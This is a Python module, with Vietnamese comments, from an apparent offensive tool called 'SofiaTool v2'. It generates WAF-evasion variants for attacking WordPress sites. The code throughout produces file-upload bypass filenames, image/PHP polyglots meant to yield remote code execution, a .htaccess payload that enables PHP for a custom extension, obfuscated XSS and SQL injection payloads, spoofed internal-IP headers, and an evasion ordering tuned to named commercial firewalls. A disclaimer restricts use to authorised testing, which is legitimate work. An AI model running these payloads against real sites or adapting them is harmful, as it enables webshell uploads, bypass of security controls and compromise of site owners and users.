"""SofiaTool v2 — wp_mutator: sinh biến thể payload né WAF cho LỚP WordPress.

File này KHÔNG tự gửi request — chỉ sinh "variant" (dict override cho request)
để `waf.evasion` chạy lần lượt. Mỗi variant có dạng::

    {"slug": "<định danh duy nhất>", "cat": "<nhóm né>", <override request>}

trong đó override có thể gồm: ``url``, ``headers``, ``data``, ``files``, ``params``.

Các lớp payload hỗ trợ:
  * upload — tên file (double extension, đuôi lạ, case, ::$DATA, null-byte,
             CRLF, backslash/ADS, query/fragment, .htaccess, ...) + spoof MIME;
             nội dung polyglot ảnh (magic bytes) + .htaccess bật handler PHP.
  * xss    — obfuscate thẻ/JS (case, entity, unicode escape, event-handler
             thay thế, đóng thẻ có khoảng trắng, ...).
  * sqli   — comment inline, đổi whitespace, đổi case, hex/char() thay thế.
  * header — spoof IP nội bộ (X-Forwarded-For...), ghi đè method/URL.
  * path   — biến thể đường dẫn (double-encode %2e, dấu ';', trailing dot/slash).

`evasion_plan(waf_info, payload_class)` trả thứ tự NhÓM né ưu tiên theo WAF.

CHỈ DÙNG CHO MỤC ĐÍCH KIỂM THỬ BẢO MẬT ĐƯỢC UỶ QUYỀN.
"""

import random
import string
import urllib.parse

from core.logger import get_logger

log = get_logger()


# --------------------------------------------------------------------- utils ---
def _rand(n=6, alphabet=string.ascii_lowercase):
    return "".join(random.choice(alphabet) for _ in range(n))


# ==================================================================== UPLOAD ==
# Đuôi thực thi được trên nhiều cấu hình (Apache mod_php, PHP-FPM với handler mở
# rộng, một số IIS). Ưu tiên họ PHP/PHAR/PHTML rồi tới các handler thay thế.
EXEC_EXTS = [
    "php", "php2", "php3", "php4", "php5", "php6", "php7", "php8",
    "phtml", "phtm", "pht", "phar", "phps", "pgif", "inc", "shtml",
    "stm", "ctp", "module", "hphp", "shtm",
]
SAFE_EXTS = ["jpg", "jpeg", "png", "gif", "txt", "pdf", "xml", "svg", "zip"]

CT_BY_EXT = {
    "jpg": "image/jpeg", "jpeg": "image/jpeg", "png": "image/png",
    "gif": "image/gif", "svg": "image/svg+xml", "txt": "text/plain",
    "pdf": "application/pdf", "zip": "application/zip",
    "xml": "application/xml", "json": "application/json",
}

# Magic bytes ảnh: ghép TRƯỚC source PHP để qua mặt kiểm tra nội dung kiểu
# `getimagesize()` / `exif_imagetype()` (PHP vẫn chạy phần <?php ... ?> sau đó).
MAGIC = {
    "gif": b"GIF89a",
    "gif87": b"GIF87a",
    "png": b"\x89PNG\r\n\x1a\n",
    "jpg": (b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01"
            b"\x00\x00\xff\xdb\x00C\x00"),
    "bmp": b"BM\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
    "webp": b"RIFF\x00\x00\x00\x00WEBPVP8 ",
}

# Đuôi tuỳ biến cho ".htaccess" (bật handler PHP cho đuôi lạ khi .php bị chặn).
HTACCESS_EXT = "sofia"


def magic_bytes(kind="gif"):
    """Trả magic bytes của 1 định dạng ảnh (b'' nếu không rõ)."""
    return MAGIC.get(kind, b"")


def polyglot(content, magic="gif"):
    """Ghép magic bytes ảnh TRƯỚC source PHP (polyglot ảnh/PHP).

    File có header hợp lệ của ảnh nhưng engine PHP vẫn thực thi đoạn <?php ?>
    phía sau -> qua mặt filter kiểm tra MIME-nội-dung mà vẫn lấy được RCE.
    """
    if isinstance(content, str):
        content = content.encode("utf-8", "replace")
    return magic_bytes(magic) + content


def content_variants(content, magics=("raw", "gif", "png", "jpg")):
    """Sinh list (slug, bytes) body upload: raw + polyglot theo nhiều magic.

    Dùng để né kiểm tra loại file dựa trên nội dung (ảnh giả) mà KHÔNG đổi
    hành vi payload.
    """
    raw = content.encode("utf-8", "replace") if isinstance(content, str) else content
    out = []
    for m in magics:
        if m in (None, "", "raw"):
            out.append(("raw", raw))
        else:
            out.append((f"magic_{m}", polyglot(raw, m)))
    return out


def htaccess_payload(ext=HTACCESS_EXT):
    """Nội dung .htaccess bật handler PHP cho đuôi tuỳ biến (bypass chặn .php).

    Upload file tên `.htaccess` (hoặc `x.htaccess`) vào cùng thư mục uploads để
    Apache map đuôi `.<ext>` (và `.<ext>7`) sang mod_php; sau đó payload đặt tên
    `name.<ext>` sẽ được thực thi dù `.php` đã bị chặn.
    """
    lines = ["# SOFIAWO",
             f"AddType application/x-httpd-php .{ext}",
             f"AddType application/x-httpd-php .{ext}7",
             f"AddHandler application/x-httpd-php .{ext}",
             f"AddHandler application/x-httpd-php .{ext}7",
             f"<FilesMatch \"\\.{ext}(7)?$\">",
             "SetHandler application/x-httpd-php",
             "</FilesMatch>"]
    return "\n".join(lines) + "\n"


def htaccess_body(ext=HTACCESS_EXT):
    """Nội dung `.htaccess` dưới dạng bytes (để đưa thẳng vào body upload)."""
    return htaccess_payload(ext).encode("utf-8", "replace")


def _stem(name):
    """Bỏ đuôi cuối cùng (nếu có) để lấy stem; giữ nguyên nếu không có dấu '.'."""
    base = name.rsplit("/", 1)[-1]
    return base.rsplit(".", 1)[0] if "." in base else base


def filename_matrix(stem, ext="php", safe_ext="jpg", seed=None):
    """Sinh list (slug, filename, content_type) để né filter tên file.

    Bao phủ rộng các kỹ thuật bypass upload phổ biến:
      exec_alt        — đuôi thực thi thay thế (.phtml/.phar/.phtm/.inc/.shtml…)
      double/triple   — .php.jpg / .jpg.php / .php.jpg.php (parser cắt đuôi cuối)
      case            — .pHp/.PHP/.Php (so khớp phân biệt hoa/thường)
      semicolon/colon — .php;.jpg / .php:.jpg (parser cắt tại ';'/':')
      trailing        — .php. / ".php " / ".php\\t" (Windows/parser bỏ qua)
      null/pct        — .php%00.jpg / .php%2500.jpg (byte NULL)
      crlf            — .php%0d%0a.jpg (header injection trong tên file)
      ads             — .php::$DATA (NTFS alternate data stream)
      query/fragment  — .php?.jpg / .php#.jpg / .php/.jpg (cắt khi check đuôi)
      backslash/path  — ..\\name.php (Windows path, bỏ phần thư mục)
      long_name       — tên dài (truncation ở filter so khớp đuôi)
      multi_dot/pct   — name...php / name..php / name%2ephp (parser đuôi lạ)
      htaccess        — .htaccess / name.htaccess / name.php.<HTACCESS_EXT>
                        (upload .htaccess bật handler PHP cho đuôi tuỳ biến)
      rand_safe       — tên ảnh an toàn (fallback để probe lại file)
    """
    rng = random.Random(seed)
    out = []
    ct_php = "application/octet-stream"
    ct_img = CT_BY_EXT.get(safe_ext, "image/jpeg")
    e = ext.lstrip(".") or "php"

    def add(slug, fn, ct=ct_php):
        out.append((slug, fn, ct))

    # 1) đuôi thực thi thay thế
    for x in EXEC_EXTS:
        if x != e:
            add(f"exec_alt_{x}", f"{stem}.{x}")
    # 2) đuôi đôi / ba (parser cắt tại đuôi cuối)
    add("double_ext", f"{stem}.{e}.{safe_ext}", ct_img)
    add("double_ext_rev", f"{stem}.{safe_ext}.{e}")
    add("double_ext_txt", f"{stem}.{e}.txt", "text/plain")
    add("double_ext_png", f"{stem}.{e}.png", CT_BY_EXT.get("png", "image/png"))
    add("double_ext_gif", f"{stem}.{e}.gif", CT_BY_EXT.get("gif", "image/gif"))
    add("triple_ext", f"{stem}.{e}.{safe_ext}.{e}")
    add("double_safe_php", f"{stem}.{safe_ext}.{e}.{safe_ext}", ct_img)
    # 3) case (so khớp phân biệt hoa/thường)
    cases = [e.upper(), e.capitalize(), e[:1].upper() + e[1:],
             "".join(c.upper() if rng.random() < 0.5 else c.lower() for c in e)]
    for i, c in enumerate(cases):
        add(f"case_{i}", f"{stem}.{c}")
    add("case_double", f"{stem}.{e.upper()}.{safe_ext}", ct_img)
    add("case_double_rev", f"{stem}.{safe_ext}.{e.upper()}")
    # 4) dấu ';' ':' (parser cắt tại đây)
    add("semicolon", f"{stem}.{e};.{safe_ext}", ct_img)
    add("semicolon2", f"{stem}.{e};{safe_ext}", ct_img)
    add("dot_colon", f"{stem}.{e}:{safe_ext}")
    add("semicolon_trail", f"{stem}.{safe_ext};.{e}")
    # 5) trailing dot / space / tab (Windows & một số parser bỏ)
    add("trailing_dot", f"{stem}.{e}.")
    add("trailing_space", f"{stem}.{e} ")
    add("trailing_tab", f"{stem}.{e}\t")
    add("trailing_dot_safe", f"{stem}.{safe_ext}.", ct_img)
    add("dot_space", f"{stem}. {e}")
    add("dot_tab", f"{stem}.\t{e}")
    add("space_before", f"{stem} .{e}")
    # 6) null byte / encode kép
    add("null_byte", f"{stem}.{e}%00.{safe_ext}", ct_img)
    add("null_byte_trail", f"{stem}.{e}%00")
    add("pct2500", f"{stem}.{e}%2500.{safe_ext}", ct_img)
    # 7) CRLF / LF injection trong tên file
    add("crlf", f"{stem}.{e}%0d%0a.{safe_ext}", ct_img)
    add("lf", f"{stem}.{e}%0a.{safe_ext}", ct_img)
    # 8) đường dẫn Windows (backslash) — tên ghi vào thư mục đích
    add("backslash", f"..\\{stem}.{e}")
    add("backslash2", f"{stem}.\\{e}")
    # 9) ADS Windows
    add("ads_data", f"{stem}.{e}::$DATA")
    add("ads_safe", f"{stem}.{e}.{safe_ext}::$DATA", ct_img)
    # 10) query/fragment/slash trong tên (cắt khi đối chiếu đuôi)
    add("query_junk", f"{stem}.{e}?.{safe_ext}", ct_img)
    add("fragment_junk", f"{stem}.{e}#.{safe_ext}", ct_img)
    add("slash_junk", f"{stem}.{e}/.{safe_ext}")
    add("pct20_tail", f"{stem}.{e}%20", ct_img)
    add("pct09_tail", f"{stem}.{e}%09")
    # 11) tên dài (truncation)
    add("long_name", f"{stem}{'A' * 200}.{e}")
    add("long_name_safe", f"{stem}{'B' * 200}.{e}.{safe_ext}", ct_img)
    # 11b) nhiều dấu '.' / encode dấu '.' trong đuôi (parser đuôi lạ)
    add("multi_dot", f"{stem}...{e}")
    add("dot_dot_ext", f"{stem}..{e}")
    add("pct_dot_ext", f"{stem}%2e{e}")
    add("space_before_ext", f"{stem} .{e}")
    # 11c) .htaccess + đuôi tuỳ biến (bật handler PHP cho HTACCESS_EXT khi
    #      .php bị chặn; file .htaccess lưu cùng thư mục uploads)
    add("dot_htaccess", ".htaccess", "text/plain")
    add("htaccess_name", f"{stem}.htaccess", "text/plain")
    add("htaccess_ext", f"{stem}.{HTACCESS_EXT}")
    add("htaccess_double", f"{stem}.{e}.{HTACCESS_EXT}")
    add("htaccess_ext_php", f"{stem}.{HTACCESS_EXT}.{e}")
    add("htaccess_alt", f"{stem}.{HTACCESS_EXT}7")
    # 12) tên an toàn ngẫu nhiên (fallback để probe lại file)
    add("rand_safe", f"{stem}_{_rand(4)}.{safe_ext}", ct_img)
    add("rand_safe_php", f"{stem}_{_rand(4)}.{safe_ext}.{e}")
    # khử trùng lặp theo filename
    seen, uniq = set(), []
    for slug, fn, ct in out:
        if fn in seen:
            continue
        seen.add(fn)
        uniq.append((slug, fn, ct))
    return uniq


def upload_variants(field_name, filename, content, content_type=None, seed=None):
    """Sinh list variant request cho 1 lần upload (đa tên file + spoof MIME).

    Trả list dict {"slug","cat","files","_filename","_content_type"}.
    """
    stem = _stem(filename)
    ext = filename.rsplit(".", 1)[-1] if "." in filename else "php"
    variants = []
    for slug, fn, ct in filename_matrix(stem, ext=ext, seed=seed):
        use_ct = content_type or ct or "application/octet-stream"
        variants.append({
            "slug": f"upload:{slug}",
            "cat": slug,
            "_filename": fn,
            "_content_type": use_ct,
            "files": {field_name: (fn, content, use_ct)},
        })
    return variants


# ======================================================================= XSS ==
_HANDLERS = [
    "</style><img src=x onerror=\"{js}\"><style>",
    "</style><svg/onload=\"{js}\"><style>",
    "</style><details open ontoggle=\"{js}\"><style>",
    "</style><body onload=\"{js}\"><style>",
    "</style><iframe srcdoc=\"&lt;script&gt;{js}&lt;/script&gt;\"><style>",
]


def _js_assign(mark, style="plain"):
    """Sinh đoạn JS đặt cờ window.<mark> theo nhiều kiểu obfuscate."""
    if style == "bracket_escape":
        # window\u005b"M\u0041RK"\u005d=1  (unicode escape hợp lệ trong JS)
        key = "".join(f"\\u{ord(c):04x}" for c in mark)
        return "window\\u005b\"%s\"\\u005d=1" % key
    if style == "hex_string":
        # window["\x4d\x41..."]=1
        key = "".join(f"\\x{ord(c):02x}" for c in mark)
        return "window[\"%s\"]=1" % key
    if style == "concat":
        half = len(mark) // 2
        return "window[\"%s\"+\"%s\"]=1" % (mark[:half], mark[half:])
    if style == "space_noise":
        return "window\t[ \"%s\" ]\n=\n1" % mark
    if style == "fromcharcode":
        codes = ",".join(str(ord(c)) for c in mark)
        return "window[String.fromCharCode(%s)]=1" % codes
    return "window.%s=1" % mark


def xss_payload_variants(mark, seed=None):
    """Sinh list payload XSS thay thế (đều đặt cờ window.<mark>).

    Trả list dict {"slug","cat","payload"} — caller tự nhét vào trường request.
    """
    out = []

    def add(slug, cat, payload):
        out.append({"slug": f"xss:{slug}", "cat": cat, "payload": payload})

    # gốc (script thường) — giữ để tương thích
    add("script_plain", "plain", "</style><script>%s;</script><style>" % _js_assign(mark))
    add("script_nosemi", "plain", "</style><script>%s</script><style>" % _js_assign(mark))
    # case mix thẻ
    add("script_case", "case", "</ScRiPt>%s;</sCrIpT>" % _js_assign(mark))
    # JS obfuscate
    add("js_bracket_escape", "js_obfuscate", "</style><script>%s;</script><style>"
        % _js_assign(mark, "bracket_escape"))
    add("js_hex_string", "js_obfuscate", "</style><script>%s;</script><style>"
        % _js_assign(mark, "hex_string"))
    add("js_concat", "js_obfuscate", "</style><script>%s;</script><style>"
        % _js_assign(mark, "concat"))
    add("js_fromcharcode", "js_obfuscate", "</style><script>%s;</script><style>"
        % _js_assign(mark, "fromcharcode"))
    add("js_space_noise", "js_obfuscate", "</style><script>%s;</script><style>"
        % _js_assign(mark, "space_noise"))
    # đóng </style> có nhiễu khoảng trắng / hoa
    add("close_space", "close_tag", "</style ><script>%s;</script><style>" % _js_assign(mark))
    add("close_newline", "close_tag", "</style\n><script>%s;</script><style>" % _js_assign(mark))
    add("close_slash", "close_tag", "</style/><script>%s;</script><style>" % _js_assign(mark))
    add("close_case", "close_tag", "</STYLE><script>%s;</script><STYLE>" % _js_assign(mark))
    # event handler thay thế
    for i, tpl in enumerate(_HANDLERS):
        add(f"handler_{i}", "handler", tpl.format(js=_js_assign(mark).rstrip(";")))
    # base64 eval (chỉ dùng khi cần; vẫn vô hại — chỉ set cờ)
    js = _js_assign(mark)
    import base64 as _b64
    b = _b64.b64encode(js.encode()).decode()
    add("eval_atob", "js_obfuscate",
        "</style><script>eval(atob(\"%s\"))</script><style>" % b)
    # nhiễu ngẫu nhiên ở tên thẻ không hợp lệ (một số WAF cắt chuỗi)
    add("junk_comment", "junk",
        "</style><script><!-- -->%s</script><style>" % _js_assign(mark))
    # Đảm bảo MỌI payload đều chứa marker dạng LITERAL (để bước xác minh
    # render `mark in page` vẫn đúng), kể cả biến thể dùng escape JS.
    # Thêm comment HTML vô hại chứa marker ở cuối — không đổi hành vi.
    for v in out:
        if mark not in v["payload"]:
            v["payload"] = v["payload"] + "<!--%s-->" % mark
    # khử trùng lặp payload
    seen, uniq = set(), []
    for v in out:
        if v["payload"] in seen:
            continue
        seen.add(v["payload"])
        uniq.append(v)
    return uniq


def xss_variants(field_name, mark, seed=None, method="data"):
    """Tiện ích: trả variant request nhét payload vào 1 trường.

    method="data"  -> override ``data`` = {field_name: payload}
    method="json"  -> override ``json`` = {field_name: payload}
    """
    out = []
    for v in xss_payload_variants(mark, seed=seed):
        over = {"json" if method == "json" else "data": {field_name: v["payload"]}}
        over.update({"slug": v["slug"], "cat": v["cat"], "payload": v["payload"]})
        out.append(over)
    return out


# ====================================================================== SQLi ==
_SQLI_BASE = "1' UNION SELECT NULL,NULL-- -"


def sql_payload_variants(payload=None, seed=None):
    """Sinh biến thể SQLi (comment inline, whitespace, case, khoảng trắng thay thế)."""
    p = payload or _SQLI_BASE
    rng = random.Random(seed)
    out = []

    def add(slug, cat, val):
        out.append({"slug": f"sqli:{slug}", "cat": cat, "payload": val})

    add("plain", "plain", p)
    add("inline_comment", "comment", p.replace("SELECT", "SEL/**/ECT")
        .replace("UNION", "UN/**/ION"))
    add("mysql_version_comment", "comment", p.replace(
        "UNION SELECT", "UNION/*!50000SELECT*/"))
    add("case_mix", "case", "".join(
        c.upper() if rng.random() < 0.5 else c.lower() for c in p))
    add("ws_tab", "whitespace", p.replace(" ", "\t"))
    add("ws_newline", "whitespace", p.replace(" ", "\n"))
    add("ws_multi", "whitespace", p.replace(" ", "%09%09"))
    add("plus_plus", "whitespace", p.replace(" ", "+"))
    add("hex_literal", "encoding", p.replace("NULL", "0x00"))
    add("char_fn", "encoding", p.replace("NULL", "CHAR(0)"))
    add("percent_0a", "encoding", p.replace("-- -", "%0a--%20"))
    add("trailing_hash", "comment", p.replace("-- -", "#"))
    seen, uniq = set(), []
    for v in out:
        if v["payload"] in seen:
            continue
        seen.add(v["payload"])
        uniq.append(v)
    return uniq


# ==================================================================== HEADERS ==
_FAKE_IPS = ["127.0.0.1", "127.0.0.1:80", "localhost", "10.0.0.1",
             "172.16.0.1", "192.168.1.1", "0.0.0.0"]
_IP_HEADERS = ["X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
               "X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "X-Host",
               "CF-Connecting-IP", "True-Client-IP", "X-Forwarded-Host",
               "X-Forwarded-Server", "Forwarded"]


def header_variants(base_headers=None):
    """Variant thêm header 'nội bộ' để qua mặt rule theo IP / whitelist.

    Trả list dict {"slug","cat","headers"} (headers đã gộp base_headers).
    """
    base = dict(base_headers or {})
    out = []
    for h in _IP_HEADERS:
        for ip in _FAKE_IPS[:3]:
            hd = dict(base)
            hd[h] = ip
            out.append({"slug": f"header:{h.lower()}={ip}", "cat": "spoof_ip",
                        "headers": hd})
    # ghi đè method / URL (một số WAF bỏ qua khi thấy method lạ)
    hd = dict(base)
    hd["X-HTTP-Method-Override"] = "POST"
    out.append({"slug": "header:method_override", "cat": "override", "headers": hd})
    hd = dict(base)
    hd["Content-Type"] = "text/plain"
    out.append({"slug": "header:ct_text", "cat": "override", "headers": hd})
    hd = dict(base)
    hd["X-Requested-With"] = "XMLHttpRequest"
    hd["Accept"] = "application/json, text/plain, */*"
    out.append({"slug": "header:ajax", "cat": "override", "headers": hd})
    return out


def path_variants(path, seed=None):
    """Biến thể đường dẫn: encode %2e, dấu ';', trailing dot/slash, case, query nhiễu."""
    rng = random.Random(seed)
    out = []

    def add(slug, cat, val):
        out.append({"slug": f"path:{slug}", "cat": cat, "path": val})

    p = path if path.startswith("/") else "/" + path
    add("plain", "plain", p)
    add("double_encode_dot", "encoding", p.replace("..", "%252e%252e")
        .replace(".php", "%252ephp"))
    add("encode_dot", "encoding", p.replace("../", "%2e%2e%2f").replace(".php", ".p%68p"))
    add("semicolon", "param", p.replace(".php", ".php;.jpg"))
    add("trailing_dot", "trailing", p + ".")
    add("trailing_slash", "trailing", p.rstrip("/") + "/")
    # case trên segment cuối
    seg = p.rsplit("/", 1)
    if len(seg) == 2 and seg[1]:
        base = "".join(c.upper() if rng.random() < 0.5 else c for c in seg[1])
        add("case_seg", "case", seg[0] + "/" + base)
    add("query_junk", "junk", p + ("?" if "?" not in p else "&") + _rand(6) + "=1")
    seen, uniq = set(), []
    for v in out:
        if v["path"] in seen:
            continue
        seen.add(v["path"])
        uniq.append(v)
    return uniq


def urlencode_url(url):
    """Encode lại URL giữ nguyên cấu trúc (dùng cho biến thể query)."""
    p = urllib.parse.urlsplit(url)
    return urllib.parse.urlunsplit((
        p.scheme, p.netloc, p.path,
        urllib.parse.urlencode(urllib.parse.parse_qsl(p.query, keep_blank_values=True)),
        p.fragment))


# ============================================================ EVASION PLAN ====
# Thứ tự NHÓM né ưu tiên theo lớp payload + WAF. evasion.py dùng để xếp variant.
_HEAVY_WAFS = {"cloudflare", "sucuri", "akamai", "fastly", "azure", "f5",
               "barracuda", "wordfence", "yundun", "safedog", "360wzws",
               "gcore", "ddosguard", "cloudfront", "citrix", "modsecurity",
               "imperva", "aws_waf", "imunify360", "patchstack", "wallarm",
               "radware", "reblaze", "qrator", "signal_sciences", "stackpath"}

_PLANS = {
    "upload": ["double_ext", "exec_alt_phar", "exec_alt_phtml", "exec_alt_pht",
               "htaccess", "htaccess_ext", "htaccess_double", "case_0",
               "semicolon", "dot_colon", "trailing_dot", "null_byte",
               "ads_data", "space_before_ext", "exec_alt_php5", "double_ext_rev"],
    "xss": ["plain", "js_obfuscate", "handler", "close_tag", "case", "junk"],
    "sqli": ["plain", "comment", "whitespace", "case", "encoding"],
    "header": ["spoof_ip", "override", "ajax"],
    "path": ["plain", "encoding", "param", "trailing", "case", "junk"],
    # REST / admin-ajax: ưu tiên spoof IP nội bộ + obfuscate XSS (nếu có) trước;
    # override/ct_text bị loại ở `common.api_header_variants` vì phá body.
    "rest": ["plain", "spoof_ip", "js_obfuscate", "handler", "close_tag",
             "override", "ajax", "case", "junk"],
    "ajax": ["plain", "spoof_ip", "js_obfuscate", "handler", "close_tag",
             "override", "ajax", "case", "junk"],
}


def evasion_plan(waf_info, payload_class):
    """Trả danh sách NHÓM né (theo thứ tự ưu tiên) cho (waf_info, payload_class).

    WAF nặng/known -> đảo ưu tiên sang nhóm obfuscate mạnh trước nhóm plain.
    """
    engine = (waf_info or {}).get("engine")
    blocked = (waf_info or {}).get("blocked") or (waf_info or {}).get("blocks_xml")
    plan = list(_PLANS.get(payload_class, ["plain"]))
    heavy = engine in _HEAVY_WAFS or blocked
    if not heavy:
        log.debug("evasion_plan: %s/%s -> light", payload_class, engine)
        return plan
    # nhóm "plain" xuống cuối khi WAF nặng; các nhóm còn lại lên trước
    if plan and plan[0] == "plain":
        plan = plan[1:] + ["plain"]
    log.debug("evasion_plan: %s/%s -> heavy %s", payload_class, engine, plan)
    return plan
